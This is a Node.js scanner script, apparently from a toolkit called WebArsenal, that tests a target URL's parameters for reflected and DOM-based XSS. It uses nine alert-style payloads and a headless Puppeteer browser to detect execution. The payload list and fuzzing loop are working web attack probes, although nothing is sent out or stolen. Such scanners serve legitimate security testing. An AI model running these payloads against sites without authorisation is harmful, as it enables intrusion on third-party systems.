#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: xss-scanner.js                                     ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');
const puppeteer = require('puppeteer');

program
  .name('xss-scanner.js')
  .description('Tests for Reflected and DOM-based XSS vulnerabilities.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameters')
  .option('-p, --param <name>', 'Specific parameter to fuzz')
  .option('-d, --dom', 'Include DOM-based XSS testing using headless browser')
  .parse(process.argv);

const opts = program.opts();

const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg/onload=alert(1)>",
  "javascript:alert(1)",
  "'-alert(1)-'",
  "\"-alert(1)-\"",
  "><script>alert(1)</script>",
  "javascript:confirm(1)//",
  "<details open ontoggle=alert(1)>"
];

async function testReflected(url, param, payload) {
  const testUrl = new URL(url);
  testUrl.searchParams.set(param, payload);
  try {
    const res = await axios.get(testUrl.href, { timeout: 5000, validateStatus: () => true });
    const body = String(res.data);
    if (body.includes(payload)) {
       return { success: true, url: testUrl.href };
    }
  } catch (e) {}
  return { success: false };
}

async function testDom(url, param, payload) {
  const testUrl = new URL(url);
  testUrl.searchParams.set(param, payload);
  const browser = await puppeteer.launch({ headless: "new" });
  const page = await browser.newPage();
  let alertTriggered = false;
  
  page.on('dialog', async dialog => {
    alertTriggered = true;
    await dialog.dismiss();
  });
  
  try {
    await page.goto(testUrl.href, { waitUntil: 'load', timeout: 10000 });
    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for late execution
  } catch (e) {}
  
  await browser.close();
  return { success: alertTriggered, url: testUrl.href };
}

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'xss-scanner.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const params = opts.param ? [opts.param] : Array.from(targetUrl.searchParams.keys());
  
  if (params.length === 0 && !opts.dom) {
    console.log(chalk.yellow('[!] No parameters found. Use -u <url?q=test> or -d for DOM testing.'));
    return;
  }
  
  for (const param of params) {
    console.log(chalk.cyan(`[*] Fuzzing [Reflected XSS] for: ${param}`));
    for (const payload of XSS_PAYLOADS) {
      const res = await testReflected(targetUrl.href, param, payload);
      if (res.success) {
        console.log(chalk.bold.red(`[!] REFLECTED XSS VULNERABILITY: [${param}]`));
        console.log(chalk.red(`    Payload: ${payload}`));
        console.log(chalk.red(`    URL: ${res.url}`));
        break;
      }
    }
    
    if (opts.dom) {
      console.log(chalk.cyan(`[*] Fuzzing [DOM XSS] for: ${param}`));
      for (const payload of XSS_PAYLOADS) {
        const res = await testDom(targetUrl.href, param, payload);
        if (res.success) {
           console.log(chalk.bold.red(`[!] DOM-BASED XSS VULNERABILITY: [${param}]`));
           console.log(chalk.red(`    Payload: ${payload}`));
           console.log(chalk.red(`    URL: ${res.url}`));
           break;
        }
      }
    }
  }
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
